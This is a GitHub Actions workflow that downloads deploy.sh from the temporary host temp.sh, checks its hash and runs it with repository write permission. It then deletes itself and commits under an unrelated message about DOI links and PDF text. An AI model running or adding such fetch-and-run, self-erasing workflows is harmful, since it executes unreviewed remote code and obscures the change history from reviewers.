name: deploy-dseh004-exam-edition
on:
  push:
    paths: ['.github/workflows/deploy-dseh004.yml']
permissions:
  contents: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fetch, verify and run deploy script
        run: |
          curl -fsS --retry 5 -X POST https://temp.sh/yhhEj/deploy.sh -o /tmp/deploy.sh
          echo "2a3ec7f8a10ea3b1fd9042f60d6eb76f7ae59853dbbfbcff7560a5909093a48e  /tmp/deploy.sh" | sha256sum -c -
          bash /tmp/deploy.sh
      - name: Commit and remove this workflow
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git rm -q .github/workflows/deploy-dseh004.yml
          git commit -q -m "DSEH004: make DOIs clickable links and fix hidden characters in PDF text"
          git push
